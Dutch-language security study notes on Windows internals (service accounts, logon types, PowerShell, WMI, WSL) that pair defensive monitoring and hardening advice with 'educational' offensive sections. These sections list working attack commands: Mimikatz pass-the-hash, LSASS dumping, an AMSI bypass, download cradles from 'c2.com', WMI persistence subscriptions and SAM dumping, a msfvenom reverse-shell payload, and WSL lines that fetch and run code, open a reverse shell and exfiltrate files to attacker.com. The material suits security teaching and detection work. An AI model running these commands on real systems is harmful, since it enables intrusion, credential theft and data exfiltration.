### Local System Account (NT AUTHORITY\SYSTEM)

::important
**NT AUTHORITY\SYSTEM — The God Account:**

- **Meest krachtige account** in Windows systemen
- Gebruikt voor **OS-gerelateerde taken** zoals het starten van Windows services
- Heeft **volledige toegang** tot het file system, registry, en alle resources
- **Meer privileges dan local administrators** — kan acties uitvoeren die admins niet kunnen
- **Geen password** — kan niet gebruikt worden voor interactive logon
- Draait met **SeDebugPrivilege**, **SeBackupPrivilege**, **SeRestorePrivilege**, en vele andere
  ::

**Gebruik van SYSTEM Account:**

- **Windows Services** — De meeste kritieke services draaien als SYSTEM
- **Scheduled Tasks** — System-level automation
- **Windows Update** — Patch installatie en system modifications
- **Device Drivers** — Kernel-mode en user-mode drivers

::warning
**Security Implications:**
Als een attacker **SYSTEM privileges** verkrijgt, heeft deze:

- **Volledige controle** over het systeem
- Toegang tot **alle user credentials** (SAM database, LSASS memory)
- Mogelijkheid om **kernel drivers te laden**
- Capability om **security software te disablen**
- Volledige **file system en registry toegang**
  ::

### Local Service Account (NT AUTHORITY\LocalService)

Het **Local Service** account is een **less privileged versie** van het SYSTEM account.

::note
**Local Service Characteristics:**

- Vergelijkbare privileges als een **local user account**
- Kan **sommige services starten** met beperkte functionaliteit
- Heeft **eigen registry hive**: `HKEY_USERS\S-1-5-19`
- Netwerk toegang met **anonymous credentials** (NULL session)
- Gebruikt voor services die **minimal privileges** vereisen
  ::

**Typische Use Cases:**

- **SSDP Discovery Service** — UPnP device discovery
- **TCP/IP NetBIOS Helper**
- **WebClient Service**
- Andere services die **geen elevated privileges** nodig hebben

### Network Service Account (NT AUTHORITY\NetworkService)

Het **Network Service** account heeft vergelijkbare privileges als een **standard domain user account**.

::note
**Network Service Characteristics:**

- Vergelijkbare privileges als **Local Service** op de lokale machine
- Kan **authenticated network sessions** opzetten
- Authenticeert op het netwerk als **computer account** (`DOMAIN\COMPUTERNAME$`)
- Heeft **eigen registry hive**: `HKEY_USERS\S-1-5-20`
- Gebruikt voor services die **network resources** moeten benaderen
  ::

**Typische Use Cases:**

- **DNS Client Service**
- **DHCP Client**
- **Windows Time Service**
- **IIS Application Pools** (default identity in oudere versies)

## 🔄 Session Logon Types

Windows onderscheidt verschillende **logon types** die in Event Viewer (Event ID 4624) worden gelogd:

| Logon Type | Naam              | Beschrijving                                             |
| ---------- | ----------------- | -------------------------------------------------------- |
| **2**      | Interactive       | Lokale keyboard/screen logon                             |
| **3**      | Network           | Netwerk verbinding (SMB shares, remote file access)      |
| **4**      | Batch             | Scheduled task execution                                 |
| **5**      | Service           | Service startup                                          |
| **7**      | Unlock            | Workstation unlock (screensaver)                         |
| **8**      | NetworkCleartext  | Network logon met cleartext credentials (IIS Basic Auth) |
| **9**      | NewCredentials    | RunAs /netonly — credentials voor network access         |
| **10**     | RemoteInteractive | Remote Desktop (RDP) logon                               |
| **11**     | CachedInteractive | Logon met cached domain credentials (offline)            |

::tip
**Defensive Monitoring:**
Monitor Event ID **4624** (successful logon) en **4625** (failed logon) voor:

- **Logon Type 3** van unexpected sources — lateral movement detection
- **Logon Type 10** van unusual locations — unauthorized RDP access
- **Logon Type 9** — mogelijk credential abuse met RunAs
- **Logon Type 4/5** — suspicious scheduled tasks of services
  ::

## 🎯 Security Implications

### Privilege Escalation Perspective

::warning
**Escalation Targets:**

- **Local Service → SYSTEM** — Vaak mogelijk via service misconfigurations
- **Network Service → SYSTEM** — Via vulnerable services of DLL hijacking
- **User → Local Admin** — Via unpatched vulnerabilities, weak permissions
- **Local Admin → SYSTEM** — Via token manipulation, scheduled tasks, service creation
  ::

**Common Escalation Techniques:**

1. **Service Account Abuse** — Misconfigured service permissions (`sc.exe`, `AccessChk.exe`)
2. **Token Impersonation** — Steal SYSTEM tokens van running processen
3. **Scheduled Tasks** — Create task running as SYSTEM
4. **AlwaysInstallElevated** — MSI installers running as SYSTEM
5. **Unquoted Service Paths** — DLL hijacking in service paths

### Lateral Movement Context

::important
**Session Types voor Lateral Movement:**

- **Logon Type 3** — PsExec, SMB authentication, WMI remote execution
- **Logon Type 9** — RunAs /netonly voor network-only credential usage
- **Logon Type 10** — RDP voor interactive remote sessions
- **Pass-the-Hash** — Network logons zonder plaintext passwords
  ::

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**Session Monitoring:**

- Enable **enhanced logon auditing** via Group Policy
- Monitor **4624** (successful logon) en **4625** (failed logon) events
- Alert op **unusual logon types** voor accounts (bijv. service accounts met Type 10)
- Track **lateral movement patterns** via Type 3 logons from workstations

**Service Account Hardening:**

- Gebruik **Group Managed Service Accounts (gMSA)** voor automated password rotation
- Implementeer **least privilege** voor service accounts
- Avoid **Local Admin** rights voor service accounts waar mogelijk
- Gebruik **Virtual Service Accounts** voor local services (geen domain account nodig)

**SYSTEM Account Protection:**

- Enable **Protected Process Light (PPL)** voor critical services
- Monitor voor **SeDebugPrivilege** usage (token manipulation attempts)
- Restrict **service creation** rights (alleen admins)
- Audit **scheduled tasks** regelmatig voor suspicious SYSTEM tasks

**RDP Hardening:**

- Enable **Network Level Authentication (NLA)**
- Gebruik **Restricted Admin Mode** voor RDP (`mstsc.exe /restrictedadmin`)
- Implementeer **multi-factor authentication (MFA)** voor RDP
- Monitor Event ID **4778** (session reconnected) en **4779** (session disconnected)
  ::

## 🎯 Offensive Perspective (Educational)

::note
**Voor Penetration Testing / Red Team:**

**Privilege Escalation:**

- **Service Enumeration:** `Get-Service | Where-Object {$_.StartType -eq "Automatic"}`
- **Service Permissions Check:** `accesschk.exe -uwcqv "Authenticated Users" *`
- **Token Impersonation:** Steal SYSTEM tokens via `Invoke-TokenManipulation`
- **Always Install Elevated:** Check registry `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

**Lateral Movement:**

- **Pass-the-Hash:** `Invoke-Mimikatz -Command "sekurlsa::pth /user:Admin /domain:DOMAIN /ntlm:HASH"`
- **PSExec:** `psexec.exe \\target -u DOMAIN\user -p password cmd.exe`
- **WMI Execution:** `wmic /node:target /user:DOMAIN\user process call create "cmd.exe"`
- **Scheduled Tasks:** `schtasks /create /tn "TaskName" /tr "payload.exe" /sc onlogon /ru SYSTEM /s target`

**SYSTEM Access:**

- **PsExec SYSTEM:** `psexec.exe -s -i cmd.exe` (requires admin)
- **Scheduled Task:** Create task as SYSTEM via Task Scheduler
- **Service Creation:** `sc.exe create MalService binPath= "C:\payload.exe" start= auto`
  ::

<!-- ## 🔍 Key Event IDs voor Monitoring

| Event ID | Beschrijving | Relevantie |
|----------|--------------|------------|
| **4624** | Successful account logon | Alle logon types — monitor voor lateral movement |
| **4625** | Failed account logon | Brute force detection, credential stuffing |
| **4672** | Special privileges assigned to new logon | Admin/SYSTEM logons — privilege escalation indicator |
| **4648** | Logon using explicit credentials | RunAs usage — credential theft indicator |
| **4778/4779** | RDP session reconnected/disconnected | RDP activity tracking |
| **4688** | New process creation | Process execution — command line logging enabled |
| **4697** | Service installed on system | Service-based persistence or privilege escalation |
| **4698** | Scheduled task created | Scheduled task persistence | -->

## processen

### Offensive & Defensive Use Cases

**Offensive (Red Team / Penetration Testing):**

- **Process Injection Detection** — Identificeer geïnjecteerde DLLs in legitieme processen
- **Privilege Discovery** — Bekijk onder welke user context processen draaien
- **Service Exploitation** — Analyseer service binary paths en permissions

**Defensive (Blue Team / Incident Response):**

- **Malware Detection** — Identificeer suspicious processen en geïnjecteerde DLLs
- **Parent-Child Anomalies** — Detecteer abnormale parent-child relationships (bijv. `cmd.exe` spawned door `winword.exe`)
- **Unsigned Binaries** — Filter op unsigned DLLs en executables
- **Network Connections** — Bekijk welke processen netwerk connecties hebben

## 📋 Samenvatting

| Concept                 | Key Takeaway                                                                                                    |
| ----------------------- | --------------------------------------------------------------------------------------------------------------- |
| **Services**            | Long-running processen die automatisch starten bij boot, beheerd via SCM (`services.msc`)                       |
| **Service Permissions** | Common privilege escalation vector — controleer altijd service permissions                                      |
| **Critical Services**   | `smss.exe`, `csrss.exe`, `lsass.exe`, `services.exe`, `winlogon.exe` — kunnen niet gestopt worden zonder reboot |
| **LSASS**               | High-value target voor credential extraction — bevat cleartext en hashed credentials in memory                  |
| **Processes**           | Achtergrond processen — sommige kunnen veilig worden beëindigd, anderen zijn kritiek                            |
| **Sysinternals Tools**  | Portable suite van admin tools — uitvoerbaar vanaf `\\live.sysinternals.com\tools`                              |
| **Task Manager**        | Built-in tool voor proces/performance monitoring — 7 tabs met verschillende functionaliteit                     |
| **Process Explorer**    | Enhanced Task Manager — toont handles, DLLs, parent-child relationships                                         |

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**LSASS Protection:**

- Enable **Credential Guard** (Windows 10 Enterprise/Education)
- Enable **LSA Protection (RunAsPPL)** via registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1`
- Monitor Event ID **4656** (handle to object requested) voor LSASS access attempts
- Monitor Event ID **10** (Sysmon ProcessAccess) voor LSASS memory reads

**Service Hardening:**

- Audit service permissions regelmatig met `AccessChk.exe` (Sysinternals)
- Implementeer **least privilege** voor service accounts
- Gebruik **Group Managed Service Accounts (gMSA)** waar mogelijk
- Monitor Event ID **7045** (nieuwe service installatie)

**Process Monitoring:**

- Deploy **Sysmon** voor gedetailleerde process creation logging (Event ID 1)
- Monitor voor **abnormale parent-child relationships**
- Alert op **suspicious process arguments** (encoded PowerShell, `wmic`, `psexec`)
- Track **unsigned binaries** en DLLs geladen in processen
  ::

## 🎯 Offensive Perspective (Educational)

::note
**Voor Penetration Testing / Red Team:**

**Reconnaissance:**

- Gebruik **Process Explorer** om interessante processen te identificeren
- **Autoruns** voor persistence locations
- **TCPView** voor active network connections

**Credential Access:**

- **ProcDump** voor LSASS memory dump: `procdump.exe -ma lsass.exe lsass.dmp`
- Offline parsing met **Mimikatz**: `sekurlsa::minidump lsass.dmp`

**Privilege Escalation:**

- **AccessChk** voor misconfigured service permissions
- **Process Explorer** voor processen draaiend als SYSTEM

**Lateral Movement:**

- **PSExec** voor remote command execution
- **PsExec64.exe \\target -u DOMAIN\user -p password cmd.exe**
  ::

## ntfs

### 🎯 Defensive Perspective

::important
**Voor Blue Team / Security Engineers:**

- Monitor **Event Viewer** voor ongebruikelijke SMB toegang (Event ID 5140, 5142, 5143, 5144, 5145)
- Audit **share permissions** regelmatig — vermijd overly permissive "Everyone" group
- Gebruik **Group Policy** voor centraal firewall management
- Implementeer **least privilege** principle voor zowel NTFS als share permissions
- Disable **SMBv1** protocol — kwetsbaar voor EternalBlue
- Monitor **hidden admin shares** (C$, ADMIN$, IPC$) voor ongeautoriseerde toegang
  ::

  ## interacting with windows

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**PowerShell Logging:**

- Enable **Script Block Logging** (Event ID 4104) — logt alle script content
- Enable **Module Logging** — logt cmdlet execution
- Enable **Transcription** — logt complete PowerShell sessions
- Monitor **Event ID 4103** (Module Logging) en **4104** (Script Block Logging)

**Execution Policy Hardening:**

- Set **AllSigned** policy via Group Policy waar mogelijk
- Deploy **AppLocker** of **Windows Defender Application Control (WDAC)** voor echte enforcement
- Monitor voor **execution policy changes** (registry monitoring)
- Alert op **"-ExecutionPolicy Bypass"** in command lines

**PowerShell Security Features:**

- Enable **Constrained Language Mode** voor restricted environments
- Implement **Just Enough Administration (JEA)** voor role-based access
- Use **PowerShell remoting** met **session configurations** voor least privilege
- Deploy **Antimalware Scan Interface (AMSI)** monitoring

**Command Line Auditing:**

- Enable **Process Creation Auditing** (Event ID 4688) met command line logging
- Monitor voor **suspicious PowerShell patterns**:
  - Encoded commands (`-enc`, `-EncodedCommand`)
  - Download cradles (`IEX`, `Invoke-WebRequest`, `Net.WebClient`)
  - Obfuscation (excessive backticks, string concatenation)
  - Base64 encoded payloads
  - Bypass attempts (`-ExecutionPolicy Bypass`, `-noprofile`, `-windowstyle hidden`)
    ::

## 🎯 Offensive Perspective (Educational)

::note
**Voor Penetration Testing / Red Team:**

**Execution Policy Bypasses:**

```powershell
# Process scope bypass
Set-ExecutionPolicy Bypass -Scope Process

# Command line bypass
powershell.exe -ExecutionPolicy Bypass -File payload.ps1

# No profile, hidden window
powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://c2.com/payload.ps1')"
```

**Obfuscation Techniques:**

```powershell
# String concatenation
$a = "IEX"; $b = "(New-Object"; $c = "Net.WebClient).DownloadString"; iex "$a $b $c('http://c2.com/p.ps1')"

# Base64 encoding
$cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (iwr http://c2.com/p.ps1)"))
powershell.exe -EncodedCommand $cmd
```

**AMSI Bypass (Educational):**

```powershell
# AMSI bypass via memory patching (example, many signatures exist)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Constrained Language Mode Bypass:**

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass attempts (various techniques, environment dependent)
```

::

## 📋 Samenvatting

| Concept                       | Key Takeaway                                                                   |
| ----------------------------- | ------------------------------------------------------------------------------ |
| **GUI**                       | Point-and-click interface — accessibility voor non-technical users             |
| **RDP**                       | Remote graphical access via TCP 3389 — primary lateral movement vector         |
| **CMD**                       | Legacy command prompt — basic commands, batch scripting                        |
| **PowerShell**                | Modern command shell — .NET integration, object-oriented, extensive automation |
| **Cmdlets**                   | PowerShell commands — Verb-Noun naming convention, 100+ core cmdlets           |
| **Aliases**                   | Shortcuts voor cmdlets — `ls` = `Get-ChildItem`, `cd` = `Set-Location`         |
| **Execution Policy**          | Safety feature, niet security control — eenvoudig te bypassen                  |
| **Script Block Logging**      | Event ID 4104 — logt alle PowerShell script content                            |
| **AMSI**                      | Antimalware Scan Interface — runtime script scanning                           |
| **Constrained Language Mode** | Beperkt PowerShell functionaliteit — defensieve hardening                      |

## 🔍 Key Event IDs voor Monitoring

| Event ID    | Bron             | Beschrijving               | Relevantie                                    |
| ----------- | ---------------- | -------------------------- | --------------------------------------------- |
| **4104**    | PowerShell       | Script Block Logging       | Alle uitgevoerde PowerShell code              |
| **4103**    | PowerShell       | Module Logging             | Cmdlet execution tracking                     |
| **4688**    | Security         | Process Creation           | Command line arguments (met auditing enabled) |
| **800-803** | PowerShell       | Pipeline execution details | Legacy PowerShell logging                     |
| **1116**    | Windows Defender | AMSI detection             | Malicious script detection                    |

## Service Permissions

### 🛡️ Security Implicaties voor Malware Development

**Offensive perspectief**:

- Zwakke service permissions = privilege escalation vector
- Service binary path modification = persistence mechanisme
- Recovery options = execution trigger

**Defensive perspectief**:

- Monitor service configuration changes (Sysmon Event ID 13)
- Audit service permissions met PowerShell scripts
- Implement least privilege voor alle service accounts
- Restrict write access op service directories (Program Files, System32)

::important
Voor red team engagements is begrip van service permissions essentieel voor privilege escalation en persistence. Voor blue team werk is dit cruciaal voor detection engineering en hardening.
::

## WMI

## 🎯 Offensive WMI Gebruik

WMI is een **krachtig tool** voor offensive security operations vanwege de **native Windows functionaliteit** en **stealthy nature**.

### WMI Reconnaissance

**System enumeration:**

```powershell
# OS information
Get-WmiObject -Class Win32_OperatingSystem

# Installed software
Get-WmiObject -Class Win32_Product

# Running processes
Get-WmiObject -Class Win32_Process

# Logged in users
Get-WmiObject -Class Win32_LoggedOnUser

# Network adapters
Get-WmiObject -Class Win32_NetworkAdapterConfiguration

# Shares
Get-WmiObject -Class Win32_Share

# Local users
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"

# Local groups
Get-WmiObject -Class Win32_Group -Filter "LocalAccount='True'"
```

**Domain reconnaissance:**

```powershell
# Domain controllers
Get-WmiObject -Class Win32_NTDomain

# Trusted domains
Get-WmiObject -Namespace root\directory\ldap -Class ds_domain
```

### WMI Lateral Movement

**Remote process execution via WMI:**

```powershell
# Method 1: Invoke-WmiMethod
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64_payload>" -ComputerName "target-pc"

# Method 2: Get-WmiObject + Create
$cmd = "cmd.exe /c whoami"
([WmiClass]"\\target-pc\root\cimv2:Win32_Process").Create($cmd)

# Method 3: wmic
wmic /node:"target-pc" /user:"DOMAIN\user" process call create "cmd.exe"
```

::note
**WMI Lateral Movement Characteristics:**

- **Logon Type 3** (Network) — Geen interactive logon
- Vereist **local administrator** privileges op target
- Gebruikt **DCOM** (port 135 + dynamic high ports) of **WinRM** (port 5985/5986)
- **Geen binary** op disk (fileless execution mogelijk)
- Moeilijker te detecteren dan **PsExec** of **RDP**
  ::

### WMI Persistence

**WMI Event Subscriptions** kunnen gebruikt worden voor **persistent backdoors**:

```powershell
# Event Filter (trigger)
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
    Name = "UpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Event Consumer (actie)
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "UpdateConsumer"
    CommandLineTemplate = "powershell.exe -enc <base64_payload>"
}

# Binding (verbind filter met consumer)
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

::warning
**WMI Persistence Detection:**
WMI event subscriptions zijn **moeilijk te detecteren** omdat ze:

- **Resident in WMI repository** zijn (niet in filesystem)
- **Overleven system reboots**
- **Weinig forensische artefacten** achterlaten
- Vaak **gemist** door standaard forensische tools
  ::

**Persistence enumereren:**

```powershell
# List event filters
Get-WmiObject -Namespace root\subscription -Class __EventFilter

# List event consumers
Get-WmiObject -Namespace root\subscription -Class __EventConsumer

# List bindings
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

### WMI Credential Dumping

**WMI kan gebruikt worden voor credential extraction:**

```powershell
# Dump SAM via WMI
wmic /node:"target" /user:"admin" /password:"pass" process call create "reg save HKLM\SAM C:\temp\sam.hiv"
wmic /node:"target" /user:"admin" /password:"pass" process call create "reg save HKLM\SYSTEM C:\temp\system.hiv"

# Copy files back via SMB
copy \\target\C$\temp\sam.hiv C:\loot\
copy \\target\C$\temp\system.hiv C:\loot\
```

## 🛡️ Defensive WMI Monitoring

WMI activiteit kan worden gemonitord voor **detection van suspicious behavior**.

### WMI Event IDs

| Event ID | Log                                        | Beschrijving                          | Relevantie                                    |
| -------- | ------------------------------------------ | ------------------------------------- | --------------------------------------------- |
| **5857** | Microsoft-Windows-WMI-Activity/Operational | WMI Activity                          | WMI provider registratie                      |
| **5858** | Microsoft-Windows-WMI-Activity/Operational | WMI error                             | WMI operatie fouten                           |
| **5860** | Microsoft-Windows-WMI-Activity/Operational | Temporary event consumer registration | Event consumer aangemaakt (persistence!)      |
| **5861** | Microsoft-Windows-WMI-Activity/Operational | Permanent event consumer registration | Permanente event consumer (persistence!)      |
| **4688** | Security                                   | Process Creation                      | WMI proces creation via command line auditing |
| **4624** | Security                                   | Successful Logon                      | WMI remote logons (Logon Type 3)              |

::important
**Critical Event IDs voor WMI Persistence:**

- **Event ID 5860** — Temporary event consumer
- **Event ID 5861** — **Permanent event consumer** (HIGH PRIORITY!)

Monitor deze events voor **WMI-based persistence** detection!
::

### WMI-Activity Operational Log

**WMI Activity logging enablen:**

De **Microsoft-Windows-WMI-Activity/Operational** log is standaard enabled maar wordt vaak **niet gemonitord**.

**Log locatie:**

```
Applications and Services Logs > Microsoft > Windows > WMI-Activity > Operational
```

**PowerShell query:**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-WMI-Activity/Operational" -MaxEvents 100
```

### Sysmon WMI Detection

**Sysmon Event IDs voor WMI:**

| Event ID | Beschrijving                               |
| -------- | ------------------------------------------ |
| **19**   | WmiEventFilter activity detected           |
| **20**   | WmiEventConsumer activity detected         |
| **21**   | WmiEventConsumerToFilter activity detected |

**Sysmon configuratie voor WMI monitoring:**

```xml
<RuleGroup name="WMI Persistence" groupRelation="or">
  <WmiEvent onmatch="include">
    <Operation condition="is">Created</Operation>
  </WmiEvent>
</RuleGroup>
```

**Sysmon query:**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=19,20,21}
```

### WMI Command-Line Detection

**Suspicious WMI patterns** in command line arguments (Event ID 4688):

```
# Suspicious WMIC patterns
wmic process call create
wmic /node:
wmic computersystem get username
wmic shadowcopy delete

# Suspicious PowerShell WMI patterns
Get-WmiObject -Class Win32_Process
Invoke-WmiMethod -Class Win32_Process -Name Create
Set-WmiInstance -Class __EventFilter
```

::tip
**Defensive Monitoring Strategy:**

1. Enable **Command Line Auditing** (Event ID 4688)
2. Monitor **WMI-Activity Operational log** voor event consumers
3. Deploy **Sysmon** voor WMI Event IDs 19, 20, 21
4. Alert op **remote WMI** (`/node:`, `-ComputerName`)
5. Audit **WMI repository changes** (file integrity monitoring op `OBJECTS.DATA`)
6. Monitor **network connections** naar DCOM ports (135, dynamic)
   ::

### WMI Persistence Hunting

**PowerShell script om WMI persistence te vinden:**

```powershell
# Enumerate all WMI event filters
$Filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter
$Filters | Select Name, Query

# Enumerate all WMI event consumers
$Consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
$Consumers | Select Name, CommandLineTemplate

# Enumerate bindings
$Bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
$Bindings | ForEach-Object {
    $Filter = $_.Filter
    $Consumer = $_.Consumer
    Write-Host "Filter: $($Filter.Name) -> Consumer: $($Consumer.Name)"
}
```

**Autoruns voor WMI persistence:**

Sysinternals **Autoruns** tool kan WMI persistence detecteren:

- **WMI tab** toont event filters, consumers en bindings
- Highlight **unsigned** of **suspicious** entries
- **VirusTotal** integratie voor reputation checking

## 🚨 WMI Hardening

::important
**Defensive Hardening Measures:**

**Access Control:**

- Restrict **WMI namespaces permissions** (`wmimgmt.msc` → Security tab)
- Only **Administrators** and **SYSTEM** should have **remote WMI access**
- Use **Group Policy** voor centralized WMI security settings

**Network Segmentation:**

- Block **DCOM ports** (135, dynamic high ports) tussen workstations
- Restrict **WinRM** (5985/5986) to management systems only
- Implement **host-based firewall rules**

**Logging & Monitoring:**

- Enable **WMI-Activity Operational log**
- Deploy **Sysmon** voor WMI Event IDs 19, 20, 21
- Enable **Command Line Auditing** (Event ID 4688)
- Monitor **Event ID 5861** (permanent event consumers)

**Detection Rules:**

- Alert op **remote WMI execution** van workstations
- Detect **WMI persistence** via event consumer creation
- Monitor **unusual WMI queries** (large data extractions)
- Track **WMI process creation** patterns

**Repository Protection:**

- Enable **file integrity monitoring** op `C:\Windows\System32\wbem\Repository\`
- Regular **WMI repository audits** voor persistence
- Baseline **legitimate event consumers** (vendor software)
  ::

## 📋 Samenvatting

| Concept                  | Key Takeaway                                                                 |
| ------------------------ | ---------------------------------------------------------------------------- |
| **WMI**                  | Windows Management Instrumentation — powerful system management subsystem    |
| **WMIC**                 | Command-line interface voor WMI (deprecated maar nog aanwezig)               |
| **Get-WmiObject**        | Legacy PowerShell cmdlet voor WMI queries (gebruik `Get-CimInstance`)        |
| **Invoke-WmiMethod**     | Legacy PowerShell cmdlet voor WMI method calls (gebruik `Invoke-CimMethod`)  |
| **WMI Repository**       | Database in `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`               |
| **WMI Reconnaissance**   | WMI classes voor system enumeration (`Win32_Process`, `Win32_Service`, etc.) |
| **WMI Lateral Movement** | Remote process execution via `Win32_Process.Create()`                        |
| **WMI Persistence**      | Event subscriptions (Filter + Consumer + Binding) voor backdoors             |
| **Detection**            | Sysmon Event IDs 19, 20, 21 en WMI-Activity Event ID 5861                    |
| **Hardening**            | Restrict WMI permissions, block DCOM/WinRM, enable comprehensive logging     |

## 🔍 Quick Reference: Veelgebruikte WMI Classes

| WMI Class                             | Beschrijving        | Use Case                              |
| ------------------------------------- | ------------------- | ------------------------------------- |
| **Win32_Process**                     | Running processen   | Process enumeration, remote execution |
| **Win32_Service**                     | Windows services    | Service enumeration, start/stop       |
| **Win32_OperatingSystem**             | OS informatie       | OS version, build, architecture       |
| **Win32_ComputerSystem**              | Computer informatie | Hostname, domain, manufacturer        |
| **Win32_LogicalDisk**                 | Disk drives         | Disk space, drive letters             |
| **Win32_NetworkAdapterConfiguration** | Network settings    | IP addresses, DNS, DHCP               |
| **Win32_Product**                     | Installed software  | Software inventory (slow!)            |
| **Win32_UserAccount**                 | Local users         | User enumeration                      |
| **Win32_Group**                       | Local groups        | Group enumeration                     |
| **Win32_Share**                       | Network shares      | Share enumeration                     |
| **Win32_StartupCommand**              | Startup programs    | Autostart persistence locations       |
| **Win32_ScheduledJob**                | Scheduled tasks     | Task enumeration (legacy AT command)  |
| **Win32_NTLogEvent**                  | Event log entries   | Event log queries                     |

## 🎯 Offensive vs. Defensive Cheat Sheet

**Offensive (Educational):**

```powershell
# Reconnaissance
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_Process | Select Name,ProcessId,CommandLine

# Lateral Movement
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName "target"

# Persistence
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="BadFilter"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="BadConsumer"; CommandLineTemplate="powershell.exe -enc <payload>"}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

**Defensive:**

```powershell
# Hunt for WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Monitor WMI activity
Get-WinEvent -LogName "Microsoft-Windows-WMI-Activity/Operational" | Where {$_.Id -eq 5861}

# Sysmon WMI events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=19,20,21}

# Remove malicious WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='BadFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventConsumer -Filter "Name='BadConsumer'" | Remove-WmiObject
```

## server core & desktop experience

## 🔐 Security Perspectief

Vanuit een security-perspectief heeft **Server Core** enkele voordelen:

### Kleiner Aanvalsoppervlak

- Minder geïnstalleerde componenten betekent minder potentiële kwetsbaarheden
- Geen GUI-services die aangevallen kunnen worden
- Minder services die standaard draaien

### Resource Efficiency

- Lagere memory footprint = minder geheugen dat aangevallen kan worden
- Snellere boot times = sneller patchen en herstarten mogelijk
- Minder CPU overhead voor GUI-rendering

### Management Overhead

- Command-line en PowerShell dwingen tot scriptbare configuraties
- Betere auditability door script-based management
- Remote management via RSAT scheidt management van production systems

::important
Voor malware development en testing is het belangrijk om beide omgevingen te begrijpen, omdat enterprise environments vaak een mix hebben van Desktop Experience (voor applicatie servers) en Server Core (voor domain controllers en infrastructure servers).
::

## WSL

## 🎯 WSL voor Offensive Security

WSL is een **krachtige tool** voor penetration testers en red teamers omdat het **native Linux security tools** op Windows systemen brengt.

### WSL Offensive Use Cases

**1. Reconnaissance & Enumeration**

```bash
# Network scanning
nmap -sC -sV -oA scan_results target.com

# DNS enumeration
dig target.com ANY
host -a target.com

# SMB enumeration (Linux tools op Windows network)
enum4linux -a 192.168.1.100
smbclient -L //192.168.1.100

# LDAP enumeration
ldapsearch -x -h dc.domain.com -b "DC=domain,DC=com"
```

**2. Web Application Testing**

```bash
# Web scanning
nikto -h http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SQLi testing
sqlmap -u "http://target.com/page?id=1" --batch

# Burp Suite (via X server)
java -jar burpsuite.jar
```

**3. Exploitation & Post-Exploitation**

```bash
# Metasploit
msfconsole

# Generate payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Listener
nc -lvnp 4444

# Password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**4. Network Pivoting**

```bash
# SSH tunneling
ssh -D 9050 user@pivot-host

# Port forwarding
ssh -L 8080:internal-server:80 user@jump-host

# Chisel (SOCKS proxy)
./chisel server -p 8000 --reverse
./chisel client target-ip:8000 R:socks
```

**5. Living Off The Land via WSL**

WSL kan gebruikt worden als **LOLBIN (Living Off the Land Binary)**:

```powershell
# Execute Linux tools voor evasion
wsl.exe -e /bin/bash -c "wget http://attacker.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh"

# Reverse shell via WSL
wsl.exe -e /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# File exfiltration
wsl.exe -e /bin/bash -c "curl -X POST -d @/mnt/c/sensitive/data.txt http://attacker.com/exfil"

# Encode/decode voor obfuscation
wsl.exe -e /bin/bash -c "echo 'payload' | base64 -d | bash"
```

::warning
**Defense Evasion:**
WSL kan gebruikt worden voor **evasion** omdat:

- Veel **endpoint security tools** WSL processes niet goed monitoren
- **Linux binaries** worden mogelijk niet gescand door Windows AV
- **WSL file system** (`\\wsl$\`) wordt vaak **genegeerd** bij scans
